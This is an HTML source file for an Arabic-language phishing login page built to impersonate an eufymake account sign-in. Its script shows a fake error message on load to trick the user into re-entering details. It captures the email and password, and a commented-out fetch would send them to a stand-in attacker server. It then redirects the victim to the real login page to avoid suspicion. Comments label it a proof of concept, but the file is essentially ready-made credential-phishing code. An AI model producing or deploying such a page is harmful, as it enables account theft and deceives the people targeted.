<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="utf-8"/>
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"/>
    <title>تسجيل الدخول</title>
    <style>
        /* الجزء الخاص بالتنسيق الذي قدمته */
        body { background-color: #101215; color: #fff; font-family: sans-serif; margin: 0; display: flex; justify-content: center; align-items: center; height: 100vh; }
        .login-container { background-color: #101215; width: 100%; max-width: 450px; padding: 40px; border-radius: 8px; box-shadow: 0 4px 24px rgba(0,0,0,0.5); text-align: center; }
        .logo { width: 100px; height: 100px; margin-bottom: 20px; }
        .error-banner { background-color: rgba(255, 51, 51, 0.1); border: 1px solid #ff3333; color: #ff3333; padding: 12px; border-radius: 8px; margin-bottom: 20px; font-size: 14px; display: none; }
        input { width: 100%; padding: 12px; margin-bottom: 15px; background: #000; border: 1px solid #333; color: #fff; border-radius: 4px; box-sizing: border-box; }
        input:focus { border-color: #88f387; outline: none; }
        .btn-signin { background-color: #88f387; color: #000; border: none; padding: 12px; width: 100%; border-radius: 8px; font-weight: bold; cursor: pointer; font-size: 16px; }
        .btn-signin:hover { background-color: #5faa5e; }
        .footer-links { margin-top: 20px; font-size: 13px; color: #88f387; cursor: pointer; }
    </style>
</head>
<body>

<div class="login-container">
    <img src="https://via.placeholder.com/100x100?text=Logo" alt="Logo" class="logo">
    
    <h2>تسجيل الدخول</h2>
    <p style="color: #666; margin-bottom: 25px;">يرجى إدخال بياناتك للمتابعة</p>

    <div id="errorMsg" class="error-banner">
        فشلت عملية تسجيل الدخول. يرجى التأكد من البيانات والمحاولة مرة أخرى.
    </div>

    <form id="phishingForm">
        <input type="email" id="email" placeholder="البريد الإلكتروني" required>
        <input type="password" id="password" placeholder="كلمة المرور" required>
        
        <button type="submit" class="btn-signin">تسجيل الدخول</button>
    </form>

    <div class="footer-links">
        <span>نسيت كلمة المرور؟</span> | <span>إنشاء حساب جديد</span>
    </div>
</div>

<script>
    // إظهار رسالة الخطأ تلقائياً بمجرد تحميل الصفحة لإيهام المستخدم بوجود خطأ سابق
    window.onload = function() {
        document.getElementById('errorMsg').style.display = 'block';
    };

    document.getElementById('phishingForm').addEventListener('submit', function(e) {
        e.preventDefault();
        
        const email = document.getElementById('email').value;
        const pass = document.getElementById('password').value;

        // طباعة البيانات في الكونسول (لأغراض PoC)
        console.log("Captured Credentials:", { email: email, password: pass });

        // إرسال البيانات إلى السيرفر الخاص بك (مثل Vercel API أو Webhook)
        // fetch('https://your-server.vercel.app/api/log', { method: 'POST', body: JSON.stringify({email, pass}) });

        alert("تم إرسال البيانات بنجاح في بيئة الاختبار.");
        
        // إعادة توجيه المستخدم للموقع الحقيقي لإبعاد الشبهات
        window.location.href = "https://makeitreal.eufymake.com/login/";
    });
</script>

</body>
</html>
